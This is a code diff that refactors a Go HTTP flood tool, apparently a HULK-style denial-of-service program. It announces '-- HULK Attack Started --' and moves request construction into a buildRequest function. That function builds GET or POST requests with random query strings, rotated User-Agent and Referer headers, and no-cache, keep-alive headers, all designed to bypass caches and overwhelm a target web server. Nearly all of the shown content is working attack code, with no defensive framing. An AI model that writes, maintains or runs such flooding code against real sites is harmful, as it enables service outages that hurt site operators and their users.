@@ -136,7 +136,8 @@ func main() {
 		cancel()
 	}()
 
-	fmt.Println("-- HULK Attack Started --\n           Go!\n")
+	fmt.Println("-- HULK Attack Started --")
+	fmt.Println("           Go!")
 	fmt.Println("Max procs        |\tResp OK |\tGot err")
 
 	// Pre-spawn all goroutines instantly
@@ -221,45 +222,7 @@ func attack(ctx context.Context, siteURL *url.URL, postData string, customHeader
 			}
 
 			reqBuf.Reset()
-
-			if postData == "" {
-				reqBuf.WriteString("GET ")
-				reqBuf.WriteString(basePath)
-				reqBuf.WriteString(paramJoiner)
-				reqBuf.WriteString(buildblock(rng, rng.Intn(7)+3))
-				reqBuf.WriteString("=")
-				reqBuf.WriteString(buildblock(rng, rng.Intn(7)+3))
-				reqBuf.WriteString(" HTTP/1.1\r\n")
-			} else {
-				reqBuf.WriteString("POST ")
-				reqBuf.WriteString(basePath)
-				reqBuf.WriteString(" HTTP/1.1\r\n")
-			}
-
-			reqBuf.WriteString("Host: ")
-			reqBuf.WriteString(siteURL.Host)
-			reqBuf.WriteString("\r\nUser-Agent: ")
-			reqBuf.WriteString(headersUseragents[rng.Intn(len(headersUseragents))])
-			reqBuf.WriteString("\r\nAccept-Charset: ")
-			reqBuf.WriteString(acceptCharset)
-			reqBuf.WriteString("\r\nReferer: ")
-			reqBuf.WriteString(headersReferers[rng.Intn(len(headersReferers))])
-			reqBuf.WriteString(buildblock(rng, rng.Intn(5)+5))
-			reqBuf.WriteString("\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\n")
-
-			for _, h := range customHeaders {
-				reqBuf.WriteString(h)
-				reqBuf.WriteString("\r\n")
-			}
-
-			if postData != "" {
-				reqBuf.WriteString("Content-Length: ")
-				reqBuf.WriteString(strconv.Itoa(len(postData)))
-				reqBuf.WriteString("\r\n\r\n")
-				reqBuf.WriteString(postData)
-			} else {
-				reqBuf.WriteString("\r\n")
-			}
+			buildRequest(reqBuf, rng, basePath, paramJoiner, siteURL.Host, postData, customHeaders)
 
 			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
 			_, err = conn.Write(reqBuf.Bytes())
@@ -300,4 +263,45 @@ func buildblock(rng *rand.Rand, size int) string {
 		buf[i] = byte(rng.Intn(25) + 65) // A-Z
 	}
 	return string(buf)
+}
+
+func buildRequest(buf *bytes.Buffer, rng *rand.Rand, basePath, paramJoiner, host, postData string, customHeaders []string) {
+	if postData == "" {
+		buf.WriteString("GET ")
+		buf.WriteString(basePath)
+		buf.WriteString(paramJoiner)
+		buf.WriteString(buildblock(rng, rng.Intn(7)+3))
+		buf.WriteString("=")
+		buf.WriteString(buildblock(rng, rng.Intn(7)+3))
+		buf.WriteString(" HTTP/1.1\r\n")
+	} else {
+		buf.WriteString("POST ")
+		buf.WriteString(basePath)
+		buf.WriteString(" HTTP/1.1\r\n")
+	}
+
+	buf.WriteString("Host: ")
+	buf.WriteString(host)
+	buf.WriteString("\r\nUser-Agent: ")
+	buf.WriteString(headersUseragents[rng.Intn(len(headersUseragents))])
+	buf.WriteString("\r\nAccept-Charset: ")
+	buf.WriteString(acceptCharset)
+	buf.WriteString("\r\nReferer: ")
+	buf.WriteString(headersReferers[rng.Intn(len(headersReferers))])
+	buf.WriteString(buildblock(rng, rng.Intn(5)+5))
+	buf.WriteString("\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\n")
+
+	for _, h := range customHeaders {
+		buf.WriteString(h)
+		buf.WriteString("\r\n")
+	}
+
+	if postData != "" {
+		buf.WriteString("Content-Length: ")
+		buf.WriteString(strconv.Itoa(len(postData)))
+		buf.WriteString("\r\n\r\n")
+		buf.WriteString(postData)
+	} else {
+		buf.WriteString("\r\n")
+	}
 }
